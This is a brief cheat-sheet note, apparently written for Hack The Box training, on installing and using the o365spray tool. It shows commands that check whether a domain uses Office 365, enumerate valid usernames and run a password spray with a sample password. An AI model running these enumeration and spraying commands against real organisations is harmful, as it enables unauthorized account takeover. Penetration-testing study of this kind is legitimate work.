O365spray
##########

Date: 2024-11-30 15:01

Status:

Installation
************

.. code-block:: console

   git clone https://github.com/0xZDH/o365spray

Usage
******
Example 1: Validate if target is using O365

.. code-block:: console


   python3 o365spray.py --validate --domain msplaintext.xyz

Example 2: identify usernames

.. code-block:: console

   python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz

Example 3: Password Spray attack #password_spray

.. code-block:: console

   python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

References
***********
https://academy.hackthebox.com/module/116/section/1173
